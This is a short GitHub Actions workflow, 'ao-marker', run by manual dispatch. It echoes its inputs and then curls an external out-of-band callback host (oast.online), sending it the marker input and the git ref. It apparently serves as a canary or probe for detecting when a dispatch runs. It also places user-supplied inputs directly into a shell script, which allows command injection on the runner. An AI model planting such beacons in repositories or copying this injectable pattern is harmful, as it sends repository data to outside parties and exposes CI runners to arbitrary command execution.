name: ao-marker
on:
  workflow_dispatch:
    inputs:
      marker:
        description: "marker string"
        required: false
        default: "none"
      ref_note:
        description: "ref note"
        required: false
        default: "none"
jobs:
  marker:
    runs-on: ubuntu-latest
    steps:
      - name: emit marker
        run: |
          echo "AO-DISPATCH-MARKER input=${{ inputs.marker }} refnote=${{ inputs.ref_note }} ref=${{ github.ref }} sha=${{ github.sha }} actor=${{ github.actor }}"
          curl -s "https://db7c150phf83476dn1t0e8niokp1twzct.oast.online/gh-dispatch?i=$(printf %s '${{ inputs.marker }}' | jq -sRr @uri)&r=$(printf %s '${{ github.ref }}' | jq -sRr @uri)" || true
